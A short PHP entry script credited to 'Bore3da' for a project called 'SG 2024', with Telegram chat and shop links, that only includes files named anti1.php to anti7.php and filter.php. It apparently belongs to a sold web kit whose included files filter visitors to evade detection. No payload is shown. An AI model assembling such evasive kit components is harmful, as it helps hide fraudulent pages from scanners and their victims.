<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */
  	include('anti1.php');
	include('anti2.php');
	include('anti3.php');
	include('anti4.php');
	include('anti5.php');
	include('anti6.php');
	include('anti7.php');
    include('filter.php');
?>